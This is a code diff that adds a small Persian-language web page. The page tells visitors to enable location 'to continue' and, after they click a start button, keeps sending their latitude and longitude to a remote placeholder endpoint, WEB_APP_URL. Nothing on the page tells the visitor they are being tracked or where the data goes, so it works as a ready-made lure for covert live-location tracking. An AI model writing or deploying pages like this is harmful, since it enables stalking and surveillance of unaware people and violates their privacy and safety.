@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>مکان یابی زنده</title>
+  <style>
+    body { text-align: center; margin-top: 100px; font-family: sans-serif; }
+    button { background-color: #8e44ad; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <h1>برای ادامه، مکان‌یابی را فعال کنید</h1>
+  <button onclick="startTracking()">شروع</button>
+
+  <script>
+    function startTracking() {
+      navigator.geolocation.watchPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        fetch('WEB_APP_URL', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat, lon, ip: "IP_NOT_AVAILABLE_IN_JS" })
+        });
+      }, err => alert("اجازه مکان را بدهید"));
+    }
+  </script>
+</body>
+</html>
